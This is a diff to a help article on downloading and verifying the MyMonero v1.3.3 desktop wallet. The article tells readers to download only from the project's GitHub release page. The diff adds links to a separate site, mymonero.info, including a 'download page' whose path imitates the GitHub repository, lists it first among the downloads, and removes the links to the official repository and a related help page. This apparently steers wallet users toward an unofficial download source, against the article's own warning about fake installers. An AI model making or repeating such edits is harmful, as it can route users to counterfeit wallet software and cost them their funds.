@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 The final MyMonero desktop release is v1.3.3, distributed for Windows as an .exe on the project's GitHub release page. Download only from that source, compare the file's SHA-256 value with the release page, and never enter your seed into an installer or website.
 
+
+The MyMonero.info site covers this in its [MyMonero desktop wallet guide](https://mymonero.info/desktop-wallet). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.
+
 ## You'll see this if
 - You need to install MyMonero desktop on a Windows computer.
 - You found several download pages and want to avoid a fake installer.
@@ -48,9 +51,9 @@ Downloading the desktop app does not restore a wallet by itself. To open an exis
 
 ---
 ## If that did not work
-If the checksum does not match, do not run the file. Revisit the project release page and verify you compared the right asset's complete SHA-256 result. Do not post a checksum together with sensitive wallet information or substitute a value from an unofficial source. For app behavior, review the [MyMonero desktop repository](https://github.com/monero-projects/mymonero-desktop-wallet).
+If the checksum does not match, do not run the file. Revisit the project release page and verify you compared the right asset's complete SHA-256 result. Do not post a checksum together with sensitive wallet information or substitute a value from an unofficial source. For app behavior, review the MyMonero desktop repository.
 
-If the verified app opens but shows no wallet, the installation may be fine while wallet recovery is still needed. Confirm the seed format, wallet identity, and restore height. A zero balance can reflect an incomplete scan; read [MyMonero balance shows zero](./mymonero-balance-shows-zero.md). The hosted web wallet login stopped, so do not follow a page claiming to restore it online.
+If the verified app opens but shows no wallet, the installation may be fine while wallet recovery is still needed. Confirm the seed format, wallet identity, and restore height. A zero balance can reflect an incomplete scan; read MyMonero balance shows zero. The hosted web wallet login stopped, so do not follow a page claiming to restore it online.
 
 The desktop app is a final, unmaintained release. It still opens wallets and sends XMR but does not receive new features or security updates. You may continue using it or restore in Cake Wallet, available for iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Never disclose your seed while comparing options.
 
@@ -91,6 +94,7 @@ No. It still opens wallets and sends XMR, but it receives no new features or sec
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
